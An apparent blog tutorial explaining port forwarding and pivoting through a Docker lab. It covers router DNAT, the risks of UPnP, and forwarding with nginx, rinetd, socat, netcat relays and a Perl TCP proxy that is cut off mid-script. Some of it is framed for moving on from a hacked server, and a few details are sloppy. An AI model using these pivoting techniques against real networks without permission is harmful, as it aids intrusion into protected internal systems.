---
layout: post
pageheader-image : /assets/img/post_backgrounds/home-matrix.png
image-base: /assets/img/pivoting/portforwarding/

title: Port Forwarding explained using Docker 
description: Get access to systems in other networks pivoting 101 

audience: [security-interested people]
level: beginner to advanced
why: improves security skills 

categories: [security, cyber, ctf, english, writeup, walkthrough, write-up, solution]

permalink: /portforwarding-docker/en

toc: true

---

x Multi Hopping durch strukturieren 
-> Letzte Kapitel Multi Hopping sshuttle durchstrukturieren
x Beispielanwendung ZPhisher zu Ende schreiben
x port forwarding without router access
--> über Tunnelsysteme
x port forwarding with vpn
x port forwarding and port triggering (siehe auch mein Router)
x port forwarding as part of the firewall

x https://github.com/sensepost/reGeorg
x https://github.com/klsecservices/rpivot
x http://cntlm.sourceforge.net/
x https://github.com/microsoft/reverse-proxy
x https://code.kryo.se/iodine/
x https://github.com/iagox86/dnscat2
x https://github.com/hotnops/gtunnel
x https://github.com/friedrich/hans + https://github.com/albertzak/hanstunnel
x https://github.com/3proxy/3proxy
x https://www.reddit.com/r/HomeNetworking/comments/cwmz71/is_upnp_actually_required_for_gaming_p2p_etc/d_jumphost

## Thanks

Before I start I want to say thanks to the following articles which are the basis of a lot of stuff described here:

- <a href="https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html">https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html</a> (Chisel and SSF)
- <a href="https://erev0s.com/blog/ssh-local-remote-and-dynamic-port-forwarding-explain-it-i-am-five/">SSH Local, Remote, Dynamic and Multi Hop Port Forwarding - Explain it like I am five!</a> (SSH)
- <a href="https://catonmat.net/perl-tcp-proxy">https://catonmat.net/perl-tcp-proxy</a> (Perl)
- <a href="https://infosecwriteups.com/gain-access-to-an-internal-machine-using-port-forwarding-penetration-testing-518c0b6a4a0e">https://infosecwriteups.com/gain-access-to-an-internal-machine-using-port-forwarding-penetration-testing-518c0b6a4a0e</a> (Combination of Local and Remote Port Forwarding)
- <a href="https://www.redhat.com/sysadmin/ssh-dynamic-port-forwarding">https://www.redhat.com/sysadmin/ssh-dynamic-port-forwarding</a> (X11 and Dynamic Forwarding)
- <a href="https://superuser.com/questions/53103/udp-traffic-through-ssh-tunnel">https://superuser.com/questions/53103/udp-traffic-through-ssh-tunnel (UDP Forwarding)</a>
- <a href="https://superuser.com/questions/96489/an-ssh-tunnel-via-multiple-hops">An SSH tunnel via multiple hops - Stackoverflow (Multi hop Port Forwarding)</a>

# Introduction

Do you know this situation? There is a great web server on your network and you want to show it to someone but don't know how?

Port forwarding can be used to make remote systems accessible that would otherwise be inaccessible.
This tutorial is about how to get access to a service or server that is located on another machine, even if it is on a different network.
In contrast to other introductions, this one is based upon <a href="https://docs.docker.com/get-docker/">docker</a>, which gives you the benefit that you can pull it out later to see how the individual steps work on a real world example if needed.
In the past, reading an article about the topic, I often had problems understanding the subject in its entirety. This had to do with the following two points:
- First, that I didn't really understand where something happens and how.
- Then, on this poor basis, I could not grasp what which command did and what I can then use it for.
This is the reason why I tried to make this tutorial as simple as possible on the one hand, and let it provide numerous examples on the other hand.

The text describes

- first how to get access to a machine in your own network
- how to use local port forwarding in your own network to get systems to you
- how to use local port forwarding with a tunnel to get systems from another network to you
- how you can use Remote Port Forwarding to send systems to another system 
- X-Forwarding and is usage to reach inside a network using a gui tool and finally
- how you can use Dynamic Port Forwarding to access multiple systems on a foreign network

The following infrastructure serves as a basis:

<div id="html" markdown="0" class="mermaid">graph TD
A(<b>outside</b><br> IP: 192.168.1.3<br>lives in 192.168.1.x) --- B(jumphost)
subgraph 192.168.2.x
B(<b>jumphost</b><br> IPs: 192.168.1.5, 192.168.2.5<br>lives in 192.168.1.x and<br>192.168.2.x ) --- C(<b>inside_server</b> 192.168.2.50 <br>lives in 192.168.2.x)
end
</div>

That is, you have two networks that intersect at one computer, the jump host. The inner network can therefore only be accessed from the outside via the jump host.
In reality the jump host could be a so called bastion host which is intended to protect against attacks from outside.
The server in the inner network, called "inside_server", has an HTTP server running in our scenario.

To start this infrastructure you need <a href="https://docs.docker.com/get-docker/">docker</a> installed:

Look for your operating system and architecture to see what specific instructions you need (<a href="https://docs.docker.com/engine/install/">https://docs.docker.com/engine/install/</a>)

Then do

<pre><code class="bash">git clone https://github.com/secf00tprint/portforwarding_test.git
cd portforwarding_test
sudo docker-compose up --build --force-recreate
</code></pre>

If you have any problems running it you can find an ([FAQ](#faq)) at the end of this article.

The following aliases are used, which you can set with:

<pre><code class="bash">alias dops='sudo docker ps -a'
alias doeti='sudo docker exec -ti '
</code></pre>

Use 

<pre><code class="bash">dops
</code></pre>

to display the Docker container IDs. 

And enter

<pre><code class="bash">doeti &lt;id&gt; bash
</code></pre> 

to log into a specific container.

For the rest of this post 3 Ids are important:

<img src="{{ page.image-base | prepend:site.baseurl }}/docker_dops_output.png" width="100%" alt="Docker ps output">

Which we will refer to as &lt;id_outside&gt;,&lt;id_jumphost&gt; and &lt;id_inside_server&gt;

# Get a server from someone else

We start with the most simple example:

Someone in the same network wants to show you something. He has an HTTP application running and wants you to inspect it on your computer.

For this we assume you are the computer "jumphost" and the other person is the computer "inside_server". Firewalls between you are switched off and port 80 is accessible from your computer.

To imitate this, log into inside_server

<pre><code class="bash">doeti &lt;id_inside_server&gt; bash
</code></pre>

Check if you have started apache:

<pre><code class="bash">netstat -atlnp | grep 80
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      12/httpd
</code></pre>

<img src="{{ page.image-base | prepend:site.baseurl }}/server_running.png" width="100%" alt="Server running">

(This `[h]` after `grep` filters that grep finds <a href="The grep program by default understands POSIX basic regular expressions.">itself</a> )

Then in another console window log into jump host:

<pre><code class="bash">doeti &lt;id_jumphost&gt; bash
</code></pre>

<div markdown="0">
  <blockquote>
  From the illustration above you can see the IP of the server &quot;inside_server&quot;. You can also retrieve it directly on the system with the <code class="bash">ip a</code> command.<br>
  On &quot;inside_server&quot; you can then use the <code class="bash">curl</code> command to access the HTTP application:<br>
  <code class="bash">curl http://&lt;ip from inside_server&gt;:80</code>.
  <br><br>
  What is the text that the HTTP application returns?
  </blockquote>
  
  <p>
    <button class="btn btn-outline-primary btn-lg btn-block" type="button" data-bs-toggle="collapse" data-bs-target="#exercise_portforwarding_1" aria-expanded="false" aria-controls="exercise_portforwarding_1">
      See Answer
    </button>
  </p>
  <div class="collapse" id="exercise_portforwarding_1">
  <div class="card card-body">
  <p class="card-text">From the picture above you can get the IP of &quot;inside_server&quot;: <code>192.168.2.50</code>. To call the http application you can leverage the command <code class="bash">curl</code> :
  <br><br>
  
  <code class="bash">
  curl http://192.168.2.50:80
  <br>
  Hi from inside server
  </code>
  <br><br>
  So the solution is <br><code class="bash">Hi from inside server</code>
  </p>
  </div>
  </div>

</div>

Or if you have <a href="https://linux.die.net/man/1/socat">socat</a> available (which is installed at the jump host):

<pre><code class="bash">printf &quot;GET / HTTP/1.0\r\n\r\n&quot; | socat - TCP4:192.168.2.50:80
HTTP/1.1 200 OK

Server: Apache/2.4.53 (Unix)
... 
Content-Type: text/html

&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hi from inside server&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
</code></pre>

You successfully reached the application which someone wanted to share with you.

# Port Forwarding and Tunneling

To get deeper into the matter you need some background knowledge:

In addition to an IP, which is used as an address in the network, a network-connected device has a port number.

This port number is used to address the correct background service on the device.

As an example from our infrastructure. The address 192.168.2.50 shows the address of the server "internal". The web server runs on port 80 on this server, so that web server can be reached unambiguously via the combination IP:port 192.168.2.50:80.
The combination of IP address and port is called a *socket*.

Now to the concept of port forwarding:

It is now possible to fetch this far IP:port combination from a reachable remote computer and bring it to you, so it is accessible at your place.
Or: The other way around, to send your own service to someone else to make reachable there.
The generic term for both forms is called port forwarding or port mapping.

There is the so-called <a href="https://en.wikipedia.org/wiki/OSI_model">OSI model</a> for communication between computing systems which sets different layers so that computing systems can speak with each other. It's like an onion. At the end you the normal user only interacts
with the onion from outside like using a web browser. But each layer deeper inside the onion defines a specific task how to communicate until you get to the point how the raw electrical or mechanical devices can talk to each other. There are 7 layers starting at layer 1 for the electrical devices.

Port Forwarding happens at the layer 5 and uses the layers below. IP is defined at layer 3 labeled "network", ports are described at layer 4 which is called "transport".
The combination of both IP and ports the sockets are handled in the 5th layer, the "session layer". The session layer controls the connections between computers and hence port forwarding. This zone establishes, manages and terminates the connections 
between a local and remote application. 

Port forwarding is initially only possible in your own network. Exception: You put a line into another network and use it. Then you can access other networks as well. This is also called "tunneling". More on this topic later.

# Local Port Forwarding

For the next scenario, you use a technique called *Local Port Forwarding*. 
This technique *brings a remote server to you*.

<img src="{{ page.image-base | prepend:site.baseurl }}/local_portforwarding_metapher.jpg" style="display:block;margin:auto" width="30%" alt="Local Port Forwarding Metapher">

The following examples for this term describe what this means inside a network - bring a remote server to you - and how to use this technique to make censored services available.

## Local Port Forwarding without tunneling / Raw Port Forwarding 

We will first look at how the concept works without using a tunneling tool. I will call that **Raw Port Forwarding**. 

### At home

<blockquote>
You want to provide a website from home. To do that, you can set up local port forwarding on your home router. After that anyone who has the IP that your internet Service Provider has provided you with can access your server from the internet.
</blockquote>

The configuration in the router could look like this in your router / access point configuration:

<div markdown="0">
<em>Port Forwarding</em>
<table style="width:100%">
  <tr>
    <th>Name</th>
    <th>IP Address</th>
    <th>Port assigned externally</th>
  </tr>
  <tr>
    <td>My Web Server</td>
    <td>192.168.178.20</td>
    <td>1500</td>
  </tr>
</table>
</div>

Other terms for "Port Forwarding" in routers are "Port Sharing" or "Virtual Server".
Sometimes you have to configure the firewall to. Most of the time if you set Port Forwarding the firewall will open automatically ports for those settings. 

To explain the scenario in more detail:

If you have internet access from home, you also have a public IP that is assigned to you on the internet by your internet Service Provider (ISP).
To get this *external address* you can do:

<pre><code class="bash">host myip.opendns.com resolver1.opendns.com
</code></pre>

or for your IPv4 address

<pre><code class="bash">curl ifconfig.me
</code></pre>

On the other hand, you have your computers that are local to your home network - your private network. Your *internal addresses* if you will.

The router now encapsulates this home network from the outside internet. It serves as the eye of the needle for the traffic between internet and home. This eye of the needle is also called the standard gateway.

In order for you to access the internet through the router, the router remembers your internal address, the internal IP and port you use to connect. 
This is done for the outgoing connections. If you want to call a website for example.
The router then exchanges the IP with the external address, the external IP and port. And the external address will connect to your target address what you call in the browser bar.
This change and remembering of IPs is called Source Network Address Translation (SNAT), because you change the source address. It is often just referred to as NAT. 

In the scenario, the other way around, someone wants to reach a server in your network from the internet. For example, somebody wants to reach your web server.
There is only the IP from your ISP reachable from the internet. Your home network is encapsulated behind NAT.
So that somebody can reach your server NAT has to change the *destination address*. This is in contrast to SNAT where it changed the source address.
This call has again an IP and Port. The IP is the IP from your external address, from your ISP.
But the target web server is inside your local network. It is not visible from outside.
If you want to make a server available to the outside world, you have to configure it in the router.

There is an external address comprised of external IP and port, sometimes called public and an internal IP and port pair, sometimes call private.
You configure the router that it changes the external address, external IP and *external port* to the internal address, the internal IP and *internal port* of it.
In this way, you communicate for example that your web server is reachable from x.y.z.d:80 from outside, where x.y.z.d is your ISP IP.
In your home office your web server sits at 192.168.1.5:8080. Then your router translates x.y.z.d:80 to 192.168.1.5:8080 for you.
This technique is called DNAT (Destination NAT). It is an equivalent term for Local Port Forwarding. 
Your router sends the request via your configuration to the internal address. This way it changes the destination address.
Some people might think it could mess up the internet. But it won't. It's only a translation work the data packets sent are the same.

So, port forwarding is not necessary if you want to use the internet and call a website. On the side you have to configure your router, if you want to make services accessible from the outside.

If you want to build up a deeper technical understanding of what happens behind the scenes at the router regarding port forwarding, I recommend the article <a href="https://www.cloudsigma.com/forwarding-ports-with-iptables-in-linux-a-how-to-guide/">Forwarding Ports with Iptables in Linux: A How-To Guide</a>.

#### IPv6

NAT is used so often because there are too few IPv4 addresses to cover all devices.
Due to the encapsulation, it looks to the outside as if there is one IP address although there is a whole network of private addresses behind it.
Since IPv4 did not provide enough space for all devices worldwide, the IETF introduced IPv6.
The address space of IPv6 is so large that NAT is no longer necessary.
If you are assigned IPv6 by your provider, you don't have to configure port forwarding to make an internal server visible to the outside.
Only the firewall blocks all incoming connections by default. If you open an IP here, it can also be reached from outside.

<div markdown="0">
<blockquote>
Besides a web server ports can also be interesting to be opened to the outside for other scenarios.
One example is when you play games. Steam needs a <a href="https://help.steampowered.com/en/faqs/view/2EA8-4D75-DA21-31EB">whole bunch</a> like port 27015.
Port Forwarding can improve the User Experience. The game running at your computer can now be reached at an additionally
specific channel from the internet. It adds accessibility. It makes your device accessible to connections started outside of your home network.
You can host a game and other players can connect directly to your machine from the internet. For example you can host a <a href="https://www.hostinger.com/tutorials/how-to-port-forward-a-minecraft-server">Minecraft server</a> where other players can play with you.
</blockquote>

Normally to configure it looks like (taken from a <a href="https://www.noip.com/support/knowledgebase/general-port-forwarding-guide/">Fritzbox</a>:

<table style="width:100%">
  <tr>
    <th>Name</th>
    <th>IP Address</th>
    <th>Port assigned externally</th>
  </tr>
  <tr>
    <td>Steam</td>
    <td>192.168.178.30</td>
    <td>27015-27030</td>
  </tr>
  <tr>
    <td>PlayStation</td>
    <td>192.168.178.20</td>
    <td>1935,3478-3480</td>
  </tr>
  <tr>
    <td>Xbox One</td>
    <td>192.168.178.10</td>
    <td>53,88,500,3074,3544,4500</td>
  </tr>
</table>

Three router examples:
If you have installed the gaming operating system Netduma DumaOS on your router, you can find the configuration under <a href="https://support.netduma.com/support/solutions/articles/16000084267-how-to-port-forward-on-the-netduma-r1-using-dumaos">Network Settings</a>.
If you live in UK and have a hub device from Virgin Media Hub you can setup port forwarding at their router like this <a href="https://www.cfos.de/en/cfos-personal-net/port-forwarding/virgin-media-hub-30.htm">here</a>.
On the other side if you bought a home pay-TV system Sky you can do it at their <a href="https://helpforum.sky.com/t5/Broadband-Talk/How-to-set-up-port-forwarding/ba-p/2662260">hub device<a>.
In this case, port forwarding does not automatically configure the firewall. This must be done in a second step as shown in the instructions.

<br>
<blockquote>
Another example for enabling port forwarding in your router is to increase download speed in <a href="https://superuser.com/questions/1053414/how-does-port-forwarding-help-in-torrents">torrent tools</a>.
</blockquote>
</div>

One thing which has nothing to do with port forwarding: If you want a more robust and fast connection you should consider to connect your server using ethernet not wireless. With wifi you have problems such as walls or other people's data volumes taking away the traffic volume, for example when watching movies. 
This is usually the problem behind packet loss.

The traffic slow down using port forwarding in the router is negligible. If you mind this and your router has a 
Quality of Service / QOS feature add your most important ports at high priority.
On the other hand, as far as games are concerned, it can increase the speed, since, for example, other players can access the game directly.
So they will reach you fast, ping you faster. However, if your game uses a dedicated server which manages the multiplayer game outside in the internet port forwaring will have no affect to your game speed.
Be aware that port mappings can get lost if you <a href="https://stackoverflow.com/questions/41036510/upnp-portforwarding-persist">restart</a> the router.

Since you open a hole to the outside through port forwarding, it is often useful especially in business environments to put the servers that are accessible from the outside into a so-called DMZ. A DMZ is a network in front of the actual internal network. The attacker takes over a server and looks around. He wants to access the sensitive other systems. But he is in a protected zone where there is not much. The internal network with the actual valuable systems is thus better protected.
If you don't have a DMZ available, when you open ports you should know what systems are behind it. They should be robust systems that are up to date. For example, it is safer to unlock a game console than a self-deployed software.

#### UPnP / Automatic Port Forwarding

Another thing to mention at this point is *UPnP* (Universal Plug and Play).
This technique is available in router configurations. It allows systems in your network to ask the router to establish temporary port forwarding. The router is the UPnP controller. 
The systems in your network have to run UPnP Client code, which is implemented in Torrent clients, Steam/Steam Deck, Nintendo-, Playstation- and XBox-consoles, 
video conferencing apps. Or you can use a UPnP Client just with a command line tool like <a href="https://manpages.debian.org/unstable/miniupnpc/upnpc.1.en.html">upnpc</a>.

<blockquote>
Imagine you have 2 XBoxes in your network. Since you can only assign one external port to a specific internal IP, one XBox is not accessible from the outside and cannot participate in the game.
</blockquote>

With UPnP, it's not like that: The control, in this case the router, can enable UPnP, and your devices which want to connect use their UPnP client. 
With this, a device can then ask the router to forward a certain port to it. The internal port the UPnP client offers. You could name it <a href="https://security.stackexchange.com/a/196838">*Automatic Port Forwarding*</a>.
Because the software in the device starts it, several XBoxes can now receive a port forwarding at the same time and play along.

The downside to this is:
UPnP causes devices on your network to open services to the outside world without your knowledge or intervention. This circumvents the principle of firewall and NAT protection.
What can an attacker do with that?

A malware can infect a device and uses UPnP to open a service to the outside. For example a running service at 127.0.0.1:1234. The attacker forwards this service to the outside to exploit the system. 
A historic example, for example, the Mirai botnet 2016 has opened <a href="https://security.stackexchange.com/questions/118918/is-upnp-still-insecure">hundreds of thousands of IP cameras with UPnP</a>.
This was especially because some devices are hard to update or cannot be updated at all like cheap IoT devices.
The botnet can also start a denial-of-service attack because it can bring a device behind the NAT to connect to a device in the internet using port forwarding. This done in a loop over multiple 
compromised systems leads to a distributed denial of service attack.

There is a similar protocol to UPnP called <a href="https://en.wikipedia.org/wiki/NAT_Port_Mapping_Protocol">NAT-PMP</a> and another named <a href="https://en.wikipedia.org/wiki/Port_Control_Protocol">PCP</a> which builds on NAT-PMP.
NAT-PMP is mostly used in Apple systems, UPnP historically was more in Microsoft systems. PCP the last devised added the possibility to handle IPv6 addresses and firewall traversal.
All those protocols implement what is called automated NAT Port mapping or **automated NAT Port forwarding**. 

From all of those UPnP is the one which is supported by most of the routers. For a deeper understanding of NAT-PMP and PCP you can look into the corresponding documentation: 
<a href="https://datatracker.ietf.org/doc/html/rfc6886">NAT-PMP RFC 6886</a> and <a href="https://datatracker.ietf.org/doc/html/rfc6887">PCP RFC 6887</a>

Be aware that if you use UPnP, NAT-PMP or PCP, all your systems should be up-to-date, and you should ideally turn those off after using it. Look that it's disabled by default in your router if they can be configured.

If you want a deeper understanding of the security concerns I recommend the article <a href="https://www.rapid7.com/blog/post/2020/12/22/upnp-with-a-holiday-cheer/">UPnP With a Holiday Cheer from Deral Heiland Rapid7</a> 
or the talk <a href="https://www.youtube.com/watch?v=rseMaljMcBY">Universal Pwn n Play from Martin Zeiser BSides Munich 2018</a>.

Some people think that another protocol would also automatically configure ports: STUN.
STUN is used mainly by phone / VoIP systems. You can use it to determine your public IP address, if your system lives behind a NAT, and if so, what type of NAT exactly. 
For that it uses an external server which you can call with a STUN client. But: It does not automatically configure port forwarding.

This should conclude the topic of automatic port forwarding in a home network.
In the next chapter we will leave home and visit a company and an airport.

A page that shows in an easy-to-understand way how to set up port forwarding for different products like Windows, games and console XBox or torrent clients at different router is <a href="https://portforward.com/>portforward.com</a>
Be aware that there is a product behind what they want to sell.

#### Port Forwarding to multiple devices

Scenario

<blockquote>You have 2 servers on the internal network listening on port 8080. How should you set the port forwarding? How can it distinguish to which server it should forward?
</blockquote>

The answer is: the external port does not have to match the internal one. That means you assign 2 different ports to the outside and forward them to the respective IPs in the internal network.

It may be that you have to activate the "Advanced" view or something similar on your router that you are able to configure it. 
It is also possible that your router does not support this option and always forwards to the same port in the internal network. In this case you can't do that :

Example (taken from a <a href="https://www.noip.com/support/knowledgebase/general-port-forwarding-guide/">Belkin router</a>)

<table style="width:100%">
  <tr>
    <th>Enable</th>
    <th>Description</th>
    <th>Inbound Port</th>
    <th>Type</th>
    <th>Private IP address</th>
    <th>Private Port</th>
  </tr>
  <tr>
    <td>&check;</td>
    <td>Webserver 1</td>
    <td>8080-8080</td>
    <td>TCP</td>
    <td>192.168.10.12</td>
    <td>8080-8080</td>
  </tr>
  <tr>
    <td>&check;</td>
    <td>Webserver 2</td>
    <td>8080-8080</td>
    <td>TCP</td>
    <td>192.168.3.7</td>
    <td>8081-8081</td>
  </tr>
</table>

Here you also explicitly set the connection to TCP. There is TCP and UDP. What you need depends on what your internal server uses. And you can find that out by looking at what port it uses. You can find a list to search for 
<a href="https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers">here</a>:

If you are unsure, use both, for example set it to "BOTH".

TCP is for a protocol where a connection is held. And the protocol makes sure that the packets arrive in the order they were sent.
UDP, on the other hand, doesn't care. Here no connection is held. The packets arrive loosely at you. But it is also faster.

Side note: There is something in the network world that can be used to reach multiple devices at once, called multicast.
A protocol that implements this is called IGMP.
When an IP packet arrives at a switch, it is copied multiple times. And this is done as often as target addresses are to be reached. This is done in IGMP by each receiver device registering with the sender beforehand. All devices to which the packet is sent have the same IP address.
And this is one of the differences to port forwarding. It is based on IPs and not on ports. And sending to multiple devices is possible (multicast) and not only one connection at a time (unicast). So it is not port forwarding.

### Tools to achieve Raw Port Forwarding

<div markdown="0">
<blockquote>
You work inside a company. Let's imagine you have access to a server. This server has 2 network interfaces. One which is accessible from the internet and one with a private IP address. 
An employee comes to you and tells you he would like to have his website, which is running on his server, on the internet. 
However, this computer is only in the private network and cannot be accessed from the internet.
</blockquote>
</div>

Now, to get its server from the private network to you on the public IP address there are several techniques among others (I only talk about the free available tools):

- Web Server like <a href="https://www.nginx.com">nginx</a> and <a href="https://httpd.apache.org/">Apache httpd</a>
- <a href="http://manpages.ubuntu.com/manpages/bionic/man8/rinetd.8.html">rinetd</a>
- <a href="http://manpages.ubuntu.com/manpages/bionic/man8/rinetd.8.html">rinetd</a>
- <a href="https://linux.die.net/man/1/socat">socat</a> or <a href="https://en.wikipedia.org/wiki/Netcat">Netcat</a> in the linux domain
- <a href="https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts">netsh</a> in Windows
- Usage of programming languages like <a href="https://www.perl.org/">Perl</a> or <a href="https://www.python.org/">Python</a>

#### nginx

The web server nginx is useful if it is already running as a web server or load balancer on the computer on which the 2 network cards are located. 

Let's check in our demo if we can reach the internal server from your exposed server:

<pre><code class="bash">doeti &lt;id_jumphost&gt; bash
curl 192.168.2.50
</code></pre>

nginx is already installed at this demo server. You could do that with

<pre><code class="bash">sudo apt install nginx
</code></pre>

Move the default configuration to from the nginx folder sites-enabled to sites-available

<pre><code class="bash">mv /etc/nginx/sites-enabled/default /etc/nginx/sites-available/default.backup
</code></pre>

Create the configuration to forward the internal server to your external interface ip:

<pre><code class="bash">vim /etc/nginx/sites-enabled/port-forward-demo

server {
    listen 192.168.1.5:9876;
    server_name _;

	location / {
		proxy_pass http://192.168.2.50:80;
                proxy_set_header Host $host;
                proxy_set_header X-Real-IP $remote_addr;
                proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
                proxy_set_header X-Forwarded-Proto https;			
	}

}
</code></pre>   

Save it:

<pre><code class="bash">wq!
</code></pre>

and restart nginx

<pre><code class="bash">service nginx restart
</code></pre>

Now open another window and go to a potenially outside computer where you can check if you can reach the inside server:

<pre><code class="bash">doeti &lt;id_outside&gt; bash

curl http://192.168.1.5:9876
</code></pre>

You should get:

<pre><code class="bash">curl http://192.168.1.5:9876
<html><body><h1>Hi from inside server</h1></body></html>
</code></pre>

<div markdown="0">
<blockquote>
Let's show at a use case where you not want to get a server outside from your device from the internal network to the outside. Rather, you want to get a local running server to the outside:
</blockquote>
</div>

<div markdown="0">

  <blockquote>
   You have a server running at localhost and you want to make it reachable at your server. Your server is facing to the internet. Go into jumphost. 
  </blockquote>

  <p>
    <button class="btn btn-outline-primary btn-lg btn-block" type="button" data-bs-toggle="collapse" data-bs-target="#exercise_portforwarding_2" aria-expanded="false" aria-controls="exercise_portforwarding_2">
      See Answer
    </button>
  </p>
  <div class="collapse" id="exercise_portforwarding_2">
  <div class="card card-body">
  <p class="card-text">

First verify at which IPs you are at jump host and then start the forwarder connecting to 192.168.2.50:22. with the corresponding credentials
  <pre><code class="bash">doeti &lt;id_jumphost&gt;
ip a  | grep 192
    inet 192.168.2.5/24 brd 192.168.2.255 scope global eth0
    inet 192.168.1.5/24 brd 192.168.1.255 scope global eth1
perl /home/jumphost/tcp-proxy2.pl 80 192.168.2.50:22
Starting a server on 0.0.0.0:80
</code></pre>

  <pre><code class="bash">doeti &lt;id_inside_client&gt;
ssh -l inside -p 80 192.168.2.5
  </code></pre>

Enter "yes" and "inside" to connect to the ssh server.

Now you can check that you were forwarded using:

<pre><code class="bash">ip a | grep 192
    inet 192.168.2.50/24 brd 192.168.2.255 scope global eth0
</code></pre>

  </p>

  </div>
  </div>

</div>

#### rinetd

The first tool in our list is rinetd. For this you must have root privileges.

First install it if not already present. We have already done this in our Docker examples:

<pre><code class="bash">sudo apt update && sudo apt install -y rinetd
</code></pre>

Now an employee wants to have the server at 192.168.2.50:80 reachable from outside.

As we saw in [nginx](#nginx) you can reach 192.168.2.50 from the jumphost.

Now get the server to you on the dual homed system:

<pre><code class="bash">vim /etc/rinetd.conf
</code></pre>

Add the following line

(For those who have not yet worked with <a href="https://www.vim.org/docs.php">vim</a>:
Use the arrow keys to move down, type `A` for append,
enter the addressed line, `Esc` and `:wq!` to save and exit)

<pre><code class="bash">192.168.1.5 8083 192.168.2.50 80
</code></pre>

This causes rinetd to take the server from 192.168.2.50:80 from the inside network (which is 192.168.2.x) and put it on the IP 192.168.1.5:8083, which is the externally reachable IP of the jump host you are on.
So everybody outside - the "internet" - represented by the 192.168.1.x network can access now the internal server.

To activate the configuration restart rinetd

<pre><code class="bash">service rinetd restart
</code></pre>

Via `netstat` you can check if the service from the server is now with you

<pre><code class="bash">netstat -atlnp | grep 8083
tcp        0      0 192.168.1.5:8083        0.0.0.0:*        zphis       LISTEN      79/rinetd 
</code></pre>

Imagine that the computer "outside" is a laptop on the internet. You could now access the internal server using the jump host IP.

Open another console representing the client

<pre><code class="bash">doeti &lt;id_outside&gt; bash
</code></pre>

<pre><code class="bash">curl http://192.168.1.5:8083
&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hi from inside server&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
</code></pre>

#### socat

The same can be done using the socat tool.

Installable with

<pre><code class="bash">sudo apt update &amp;&amp; sudo apt install -y socat
</code></pre>

Again, we have already done this in the Docker examples.

The procedure is similar

<pre><code class="bash">doeti &lt;id_jumphost&gt;
socat TCP-LISTEN:8080,fork,reuseaddr TCP:192.168.2.50
</code></pre>

(for a deeper understanding, cf <a href="https://unix.stackexchange.com/a/187038">https://unix.stackexchange.com/a/187038</a>)

Check what is reachable:

<pre><code class="bash">doeti &lt;id_jumphost&gt; 
curl http://127.0.0.1:8080
&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hi from inside server&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
curl http://192.168.2.5:8080
&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hi from inside server&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
curl http://192.168.1.5:8080
&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hi from inside server&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
</code></pre>

Now you can reach the internal server from outside:

<pre><code class="bash">doeti &lt;id_outside&gt; bash
curl http://192.168.1.5:8080
&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hi from inside server&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
</code></pre>

#### netcat

`netcat` can also be leveraged.

The standard way for installation is:

<pre><code class="bash">sudo apt-get install -y netcat</code></pre>

And you forward 192.168.2.50:80 to you with:

<pre><code class="bash">mkfifo backpipe
while true; do nc -l 8080 0&lt;backpipe | nc 192.168.2.50 80 1&gt;backpipe; done
</code></pre>

On a Debian system it looks a little bit different: 

<pre><code class="bash">sudo apt-get install -y netcat-traditional
while true; do nc.traditional -l -p 8080 -c &quot;nc 192.168.2.50 80&quot;; done
</code></pre>
#netcat
If you have problems exiting it with 

<pre><code>Ctrl-C
</code></pre>

enter 
<pre><code>Ctrl-Z
</code></pre>

search the pid with
<pre><code class="bash">ps aux
</code></pre>

and kill the process with
<pre><code class="bash">kill -9 &lt;pid&gt;
</code></pre>

#### Perl

Sometimes it is the case that you cannot install any software. This can be if you have hacked into a server, but it is not possible to extend the privileges.

What you can then use is the programming language <a href="https://www.perl.org/">Perl</a>, which is mostly preinstalled on linux systems and unixoid servers.

The following code uses the modules `IO:Socket` and `IO:Select`, which are often on linux systems already installed. Save it to a file `tcp-proxy2.pl`:

<pre><code class="perl">use warnings;
use strict;

use IO::Socket::INET;
use IO::Select;

my @allowed_ips = (&#39;all&#39;, &#39;10.10.10.5&#39;);
my $ioset = IO::Select-&gt;new;
my %socket_map;

my $debug = 1;

sub new_conn {
    my ($host, $port) = @_;
    return IO::Socket::INET-&gt;new(
        PeerAddr =&gt; $host,
        PeerPort =&gt; $port
    ) || die &quot;Unable to connect to $host:$port: $!&quot;;
}

sub new_server {
    my ($host, $port) = @_;
    my $server = IO::Socket::INET-&gt;new(
        LocalAddr =&gt; $host,
        LocalPort =&gt; $port,
        ReuseAddr =&gt; 1,
        Listen    =&gt; 100
    ) || die &quot;Unable to listen on $host:$port: $!&quot;;
}

sub new_connection {
    my $server = shift;
    my $remote_host = shift;
    my $remote_port = shift;

    my $client = $server-&gt;accept;
    my $client_ip = client_ip($client);

    unless (client_allowed($client)) {
        print &quot;Connection from $client_ip denied.\n&quot; if $debug;
        $client-&gt;close;
        return;
    }
    print &quot;Connection from $client_ip accepted.\n&quot; if $debug;

    my $remote = new_conn($remote_host, $remote_port);
    $ioset-&gt;add($client);
    $ioset-&gt;add($remote);

    $socket_map{$client} = $remote;
    $socket_map{$remote} = $client;
}

sub close_connection {
    my $client = shift;
    my $client_ip = client_ip($client);
    my $remote = $socket_map{$client};

    $ioset-&gt;remove($client);
    $ioset-&gt;remove($remote);

    delete $socket_map{$client};
    delete $socket_map{$remote};

    $client-&gt;close;
    $remote-&gt;close;

    print &quot;Connection from $client_ip closed.\n&quot; if $debug;
}

sub client_ip {
    my $client = shift;
    return inet_ntoa($client-&gt;sockaddr);
}

sub client_allowed {
    my $client = shift;
    my $client_ip = client_ip($client);
    return grep { $_ eq $client_ip || $_ eq &#39;all&#39; } @allowed_ips;
}

die &quot;Usage: $0 &lt;local port&gt; &lt;remote_host:remote_port&gt;&quot; unless @ARGV == 2;

